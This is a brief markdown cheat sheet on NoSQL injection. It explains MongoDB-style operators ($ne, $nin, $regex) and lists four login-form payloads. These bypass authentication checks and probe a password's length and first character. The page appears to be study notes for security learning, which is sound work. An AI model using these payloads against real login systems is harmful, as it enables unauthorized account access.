## No SQL
*Instead of using traditional SQL syntax (like in SQL injection), NoSQL injection targets query formats such as JSON, JavaScript objects, or query operators. Databases such as MongoDB
Apache, CouchDB, Couchbase, Amazon DocumentDB may be susceptible to NoSql injection.

**Syntax**
* $nin (not in) - Matches values not in a given list
* $ne (not equal) - Matches values not equal to a value
* [$regex] - Matches values based on a pattern (regular expression)
    * [$regex]=^.{7}$ - Matches values that are exactly 7 characters long
    * ^a......$ - Matches values that start with “a” and are exactly 7 characters long

**different payloads** *PUT REQUEST*
-  ```username[$ne]=user123&password[$ne]=pass123``` - *Matches any user whose username is NOT "user123" AND password is NOT "pass123".3*
-  ```username[$nin][]=user123&password[$ne]=pass123``` - *Matches any user whose username is NOT in the list “user123” AND password is NOT "pass123".*
-  ```username=user123&password[$regex]=^.{7}$``` - *Matches any password that is 7 characters long*
-  ```username=user123&password[$regex]=^a......$``` - *Matches any password that is 7 characters long and starts with a**
